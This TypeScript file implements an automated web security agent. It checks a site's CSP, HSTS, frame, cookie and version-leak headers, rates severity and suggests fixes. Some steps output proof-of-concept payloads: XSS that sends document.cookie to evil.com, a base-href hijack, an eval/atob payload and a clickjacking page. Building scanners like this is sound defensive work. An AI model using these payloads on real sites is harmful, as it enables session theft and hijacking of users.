import * as https from 'https'
import * as http from 'http'
import { BaseAgent, AgentStep, AgentResult, Evidence } from './agent-framework'

async function fetchUrl(url: string): Promise<{ statusCode: number; headers: Record<string, string>; body: string } | null> {
  return new Promise((resolve) => {
    const client = url.startsWith('https') ? https : http
    const req = client.get(url, { timeout: 8000, rejectUnauthorized: false }, (res) => {
      const headers: Record<string, string> = {}
      for (const [k, v] of Object.entries(res.headers)) {
        headers[k.toLowerCase()] = Array.isArray(v) ? v.join(', ') : (v ?? '')
      }
      let body = ''
      res.on('data', (chunk) => { body += chunk.toString().substring(0, 30000) })
      res.on('end', () => resolve({ statusCode: res.statusCode ?? 0, headers, body }))
    })
    req.on('error', () => resolve(null))
    req.on('timeout', () => { req.destroy(); resolve(null) })
  })
}

export class HeaderSecurityAgent extends BaseAgent {
  name = 'header-security-agent'
  description = 'Exploits and verifies missing/weak security headers: CSP bypass, clickjacking, MIME sniffing, cookie theft'
  handles = [
    'header:missing-csp', 'header:missing-hsts', 'header:missing-xframe',
    'header:missing-xcto', 'header:weak-csp', 'header:insecure-cookie',
    'header:info-leak'
  ]

  plan(finding: any): { name: string; description: string }[] {
    switch (finding._findingType) {
      case 'header:missing-csp':
      case 'header:weak-csp':
        return [
          { name: 'verify-csp', description: 'Fetch current CSP header value' },
          { name: 'test-inline-script', description: 'Check if inline scripts execute (XSS vector)' },
          { name: 'test-unsafe-eval', description: 'Check if eval() is permitted by CSP' },
          { name: 'test-base-uri', description: 'Check if base-uri is restricted' },
          { name: 'generate-xss-poc', description: 'Generate proof-of-concept for CSP bypass' },
        ]
      case 'header:missing-xframe':
        return [
          { name: 'verify-xframe', description: 'Check X-Frame-Options and CSP frame-ancestors' },
          { name: 'test-iframe-embed', description: 'Attempt to embed the page in an iframe' },
          { name: 'generate-clickjack-poc', description: 'Generate clickjacking proof-of-concept' },
        ]
      case 'header:missing-hsts':
        return [
          { name: 'verify-hsts', description: 'Check for HSTS header on HTTPS response' },
          { name: 'test-http-redirect', description: 'Test HTTP → HTTPS redirect behavior' },
          { name: 'test-ssl-strip', description: 'Simulate SSL stripping attack conditions' },
        ]
      case 'header:insecure-cookie':
        return [
          { name: 'verify-cookie-flags', description: 'Check Set-Cookie for Secure, HttpOnly, SameSite' },
          { name: 'test-cookie-scope', description: 'Check Domain and Path scope of cookies' },
          { name: 'test-js-access', description: 'Verify if cookies are accessible via JavaScript' },
        ]
      case 'header:info-leak':
        return [
          { name: 'enumerate-leaks', description: 'Catalog all information-leaking headers' },
          { name: 'fingerprint-stack', description: 'Reconstruct the full tech stack from headers' },
          { name: 'search-cves', description: 'Map leaked versions to known CVEs' },
        ]
      default:
        return [
          { name: 'verify-header', description: 'Verify the reported header issue' },
          { name: 'assess-impact', description: 'Assess the security impact' },
        ]
    }
  }

  async executeStep(stepName: string, finding: any, previousSteps: AgentStep[]): Promise<string> {
    const url = finding._target

    switch (stepName) {
      case 'verify-csp': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR] Could not fetch URL'
        const csp = res.headers['content-security-policy'] ?? null
        const cspRo = res.headers['content-security-policy-report-only'] ?? null
        if (!csp && !cspRo) {
          return '[CONFIRMED] No Content-Security-Policy header present. Page is vulnerable to XSS.'
        }
        const policy = csp ?? cspRo!
        const issues: string[] = []
        if (policy.includes("'unsafe-inline'")) issues.push("unsafe-inline allows inline script execution")
        if (policy.includes("'unsafe-eval'")) issues.push("unsafe-eval allows eval(), Function(), and similar")
        if (policy.includes('*')) issues.push("Wildcard source (*) allows loading from any origin")
        if (!policy.includes('default-src')) issues.push("No default-src fallback directive")
        if (!policy.includes('script-src')) issues.push("No script-src directive — falls back to default-src")
        if (policy.includes('data:')) issues.push("data: URI scheme allowed — can inject via data: URLs")
        return issues.length > 0
          ? `[WEAK CSP] Policy: ${policy.substring(0, 200)}\nIssues:\n${issues.map(i => `  • ${i}`).join('\n')}`
          : `[STRONG CSP] Policy appears well-configured: ${policy.substring(0, 200)}`
      }

      case 'test-inline-script': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR]'
        const csp = res.headers['content-security-policy'] ?? ''
        if (!csp || csp.includes("'unsafe-inline'") || !csp.includes('script-src')) {
          return `[VULNERABLE] Inline scripts would execute. XSS payloads like <script>alert(1)</script> are not blocked by CSP.`
        }
        return `[BLOCKED] CSP would block inline scripts: ${csp.substring(0, 150)}`
      }

      case 'test-unsafe-eval': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR]'
        const csp = res.headers['content-security-policy'] ?? ''
        if (!csp || csp.includes("'unsafe-eval'")) {
          return `[VULNERABLE] eval() is permitted. Attackers can execute arbitrary code via eval-based XSS payloads.`
        }
        return `[BLOCKED] CSP blocks eval()`
      }

      case 'test-base-uri': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR]'
        const csp = res.headers['content-security-policy'] ?? ''
        if (!csp || !csp.includes('base-uri')) {
          return `[VULNERABLE] No base-uri restriction. An attacker can inject <base href="https://evil.com"> to hijack relative URLs.`
        }
        return `[SAFE] base-uri is restricted in CSP`
      }

      case 'generate-xss-poc': {
        const priorOutput = previousSteps.map(s => s.output ?? '').join('\n')
        if (!priorOutput.includes('[VULNERABLE]')) {
          return '[NO POC] CSP appears to block the tested XSS vectors.'
        }
        return `[POC] XSS Proof-of-Concept for ${url}:

<!-- Reflected XSS test -->
${url}?q=<script>alert(document.domain)</script>

<!-- Stored XSS test payload -->
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

<!-- eval-based (if unsafe-eval allowed) -->
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">

<!-- base-uri hijack (if no base-uri) -->
<base href="https://evil.com"><script src="/malicious.js"></script>`
      }

      case 'verify-xframe': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR]'
        const xfo = res.headers['x-frame-options'] ?? null
        const csp = res.headers['content-security-policy'] ?? ''
        const hasFrameAncestors = csp.includes('frame-ancestors')
        if (!xfo && !hasFrameAncestors) {
          return `[VULNERABLE] No X-Frame-Options or CSP frame-ancestors. Page can be framed by any origin.`
        }
        return `X-Frame-Options: ${xfo ?? 'not set'}\nCSP frame-ancestors: ${hasFrameAncestors ? 'present' : 'not set'}`
      }

      case 'test-iframe-embed': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR]'
        const xfo = (res.headers['x-frame-options'] ?? '').toUpperCase()
        if (xfo === 'DENY' || xfo === 'SAMEORIGIN') {
          return `[BLOCKED] X-Frame-Options: ${xfo} prevents framing`
        }
        return `[FRAMEABLE] Page can be embedded in an iframe from any origin`
      }

      case 'generate-clickjack-poc': {
        const prior = previousSteps.map(s => s.output ?? '').join('\n')
        if (!prior.includes('[VULNERABLE]') && !prior.includes('[FRAMEABLE]')) {
          return '[NO POC] Page cannot be framed.'
        }
        return `[POC] Clickjacking Proof-of-Concept:

<html>
<head><title>Clickjacking PoC</title></head>
<body>
<h2>Click the button below to win a prize!</h2>
<div style="position:relative; width:500px; height:400px;">
  <iframe src="${url}" style="opacity:0.01; position:absolute; top:0; left:0; width:500px; height:400px; z-index:2;"></iframe>
  <button style="position:absolute; top:200px; left:200px; z-index:1; padding:20px; font-size:18px;">
    CLAIM PRIZE
  </button>
</div>
</body>
</html>`
      }

      case 'verify-hsts': {
        const res = await fetchUrl(url.replace('http://', 'https://'))
        if (!res) return '[ERROR]'
        const hsts = res.headers['strict-transport-security'] ?? null
        if (!hsts) {
          return `[VULNERABLE] No HSTS header. Users can be SSL-stripped on first visit.`
        }
        const maxAgeMatch = hsts.match(/max-age=(\d+)/)
        const maxAge = maxAgeMatch ? parseInt(maxAgeMatch[1]) : 0
        const issues: string[] = []
        if (maxAge < 31536000) issues.push(`max-age too low (${maxAge}s) — should be at least 31536000 (1 year)`)
        if (!hsts.includes('includeSubDomains')) issues.push('Missing includeSubDomains')
        if (!hsts.includes('preload')) issues.push('Missing preload directive')
        return issues.length > 0
          ? `[WEAK HSTS] ${hsts}\nIssues:\n${issues.map(i => `  • ${i}`).join('\n')}`
          : `[STRONG HSTS] ${hsts}`
      }

      case 'test-http-redirect': {
        const httpUrl = url.replace('https://', 'http://')
        return new Promise((resolve) => {
          http.get(httpUrl, { timeout: 5000 }, (res) => {
            res.resume()
            if (res.statusCode && res.statusCode >= 300 && res.statusCode < 400) {
              const location = res.headers['location'] ?? ''
              if (location.startsWith('https://')) {
                resolve(`[REDIRECTS] HTTP → HTTPS redirect in place (${res.statusCode} → ${location})`)
              } else {
                resolve(`[WEAK] Redirects but not to HTTPS: ${location}`)
              }
            } else {
              resolve(`[VULNERABLE] HTTP responds with ${res.statusCode} — no redirect to HTTPS. SSL stripping possible.`)
            }
          }).on('error', () => resolve('[ERROR] Could not connect via HTTP'))
        })
      }

      case 'test-ssl-strip': {
        const httpResult = previousSteps.find(s => s.name === 'test-http-redirect')?.output ?? ''
        const hstsResult = previousSteps.find(s => s.name === 'verify-hsts')?.output ?? ''
        if (httpResult.includes('[VULNERABLE]') && hstsResult.includes('[VULNERABLE]')) {
          return `[SSL STRIP POSSIBLE] No HSTS + no HTTP redirect = attacker on the network can intercept and downgrade the connection.`
        }
        if (hstsResult.includes('[VULNERABLE]')) {
          return `[FIRST-VISIT RISK] HTTP redirects to HTTPS but no HSTS — first visit is vulnerable to SSL stripping.`
        }
        return '[PROTECTED] HSTS and redirect are in place.'
      }

      case 'verify-cookie-flags': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR]'
        const setCookie = res.headers['set-cookie'] ?? ''
        if (!setCookie) return '[NO COOKIES] No Set-Cookie header found'
        const flags: string[] = []
        if (!setCookie.toLowerCase().includes('secure')) flags.push('[MISSING] Secure flag — cookie sent over HTTP')
        if (!setCookie.toLowerCase().includes('httponly')) flags.push('[MISSING] HttpOnly flag — cookie accessible via JS')
        if (!setCookie.toLowerCase().includes('samesite')) flags.push('[MISSING] SameSite — vulnerable to CSRF')
        return `Set-Cookie: ${setCookie.substring(0, 200)}\n\n${flags.length > 0 ? flags.join('\n') : '[ALL FLAGS PRESENT]'}`
      }

      case 'test-cookie-scope': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR]'
        const setCookie = res.headers['set-cookie'] ?? ''
        const domainMatch = setCookie.match(/Domain=([^;]+)/i)
        const pathMatch = setCookie.match(/Path=([^;]+)/i)
        const issues: string[] = []
        if (domainMatch) {
          const domain = domainMatch[1].trim()
          if (domain.startsWith('.')) issues.push(`[WIDE SCOPE] Domain=${domain} — cookie shared across all subdomains`)
        }
        if (pathMatch && pathMatch[1].trim() === '/') {
          issues.push('[WIDE PATH] Path=/ — cookie sent to all paths')
        }
        return issues.length > 0 ? issues.join('\n') : 'Cookie scope appears appropriately restricted'
      }

      case 'test-js-access': {
        const cookieResult = previousSteps.find(s => s.name === 'verify-cookie-flags')?.output ?? ''
        if (cookieResult.includes('[MISSING] HttpOnly')) {
          return `[VULNERABLE] Cookies are accessible via document.cookie. Combined with XSS, this enables session hijacking:\n\nfetch('https://evil.com/steal?c=' + document.cookie)`
        }
        return '[PROTECTED] HttpOnly flag prevents JavaScript access to cookies.'
      }

      case 'enumerate-leaks': {
        const res = await fetchUrl(url)
        if (!res) return '[ERROR]'
        const leakHeaders = ['server', 'x-powered-by', 'x-aspnet-version', 'x-aspnetmvc-version', 'x-generator', 'x-runtime', 'x-version']
        const found: string[] = []
        for (const h of leakHeaders) {
          if (res.headers[h]) found.push(`${h}: ${res.headers[h]}`)
        }
        return found.length > 0
          ? `Information leaking headers:\n${found.join('\n')}`
          : 'No significant information leakage detected in headers'
      }

      case 'fingerprint-stack': {
        const leaks = previousSteps.find(s => s.name === 'enumerate-leaks')?.output ?? ''
        const stack: string[] = []
        if (leaks.includes('nginx')) stack.push('Web Server: Nginx')
        if (leaks.includes('Apache')) stack.push('Web Server: Apache')
        if (leaks.includes('IIS')) stack.push('Web Server: Microsoft IIS')
        if (leaks.includes('Express')) stack.push('Framework: Express.js (Node.js)')
        if (leaks.includes('PHP')) stack.push('Language: PHP')
        if (leaks.includes('ASP.NET')) stack.push('Framework: ASP.NET')
        return stack.length > 0
          ? `Reconstructed tech stack:\n${stack.join('\n')}`
          : 'Could not reconstruct tech stack from headers alone'
      }

      case 'search-cves': {
        const leaks = previousSteps.find(s => s.name === 'enumerate-leaks')?.output ?? ''
        const versionPatterns = [
          { pattern: /nginx\/(\S+)/i, software: 'nginx' },
          { pattern: /Apache\/(\S+)/i, software: 'Apache' },
          { pattern: /PHP\/(\S+)/i, software: 'PHP' },
          { pattern: /IIS\/(\S+)/i, software: 'IIS' },
        ]
        const results: string[] = []
        for (const vp of versionPatterns) {
          const match = leaks.match(vp.pattern)
          if (match) {
            results.push(`${vp.software} ${match[1]}: Search https://cve.mitre.org for known vulnerabilities`)
          }
        }
        return results.length > 0
          ? `Version-to-CVE mapping:\n${results.join('\n')}\n\nNote: Automated CVE lookup requires NVD API integration.`
          : 'No specific software versions found to map to CVEs.'
      }

      case 'verify-header':
      case 'assess-impact': {
        return `Verified header finding: ${finding._findingType} on ${url}`
      }

      default:
        return `Step ${stepName} not implemented`
    }
  }

  analyze(finding: any, steps: AgentStep[]): AgentResult {
    const evidence: Evidence[] = steps.filter(s => s.output).map(s => ({
      type: (s.name.includes('poc') ? 'payload' : 'log') as Evidence['type'],
      label: s.name,
      content: s.output!
    }))

    const allOutput = steps.map(s => s.output ?? '').join('\n')
    const isVulnerable = allOutput.includes('[VULNERABLE]') || allOutput.includes('[WEAK')
    const hasPoc = allOutput.includes('[POC]')

    let severity: AgentResult['severity'] = 'info'
    if (finding._findingType === 'header:missing-csp' && isVulnerable) severity = 'high'
    else if (finding._findingType === 'header:missing-hsts' && isVulnerable) severity = 'high'
    else if (finding._findingType === 'header:missing-xframe' && isVulnerable) severity = 'medium'
    else if (finding._findingType === 'header:insecure-cookie' && isVulnerable) severity = 'high'
    else if (isVulnerable) severity = 'medium'

    return {
      verified: isVulnerable,
      exploitable: hasPoc,
      severity,
      evidence,
      recommendations: this.getRecommendations(finding._findingType),
      rawOutput: allOutput,
      cweId: this.getCwe(finding._findingType),
      cvssScore: hasPoc ? 6.1 : (isVulnerable ? 4.3 : null)
    }
  }

  private getRecommendations(type: string): string[] {
    const map: Record<string, string[]> = {
      'header:missing-csp': [
        "Implement a strict CSP: default-src 'self'; script-src 'self'; style-src 'self'",
        "Use nonce-based or hash-based CSP for inline scripts",
        "Avoid unsafe-inline and unsafe-eval",
      ],
      'header:missing-hsts': [
        "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
        "Submit domain to the HSTS preload list",
        "Ensure HTTP → HTTPS redirect is in place",
      ],
      'header:missing-xframe': [
        "Add X-Frame-Options: DENY or SAMEORIGIN",
        "Use CSP frame-ancestors directive for more granular control",
      ],
      'header:insecure-cookie': [
        "Set Secure flag on all cookies",
        "Set HttpOnly flag on session cookies",
        "Set SameSite=Strict or SameSite=Lax",
        "Scope cookies to the tightest Domain and Path possible",
      ],
      'header:info-leak': [
        "Remove Server, X-Powered-By, and other version-revealing headers",
        "Configure the web server to suppress default headers",
      ],
    }
    return map[type] ?? ['Review and implement recommended security headers']
  }

  private getCwe(type: string): string | null {
    const map: Record<string, string> = {
      'header:missing-csp': 'CWE-693',
      'header:weak-csp': 'CWE-693',
      'header:missing-hsts': 'CWE-319',
      'header:missing-xframe': 'CWE-1021',
      'header:insecure-cookie': 'CWE-614',
      'header:info-leak': 'CWE-200',
    }
    return map[type] ?? null
  }
}
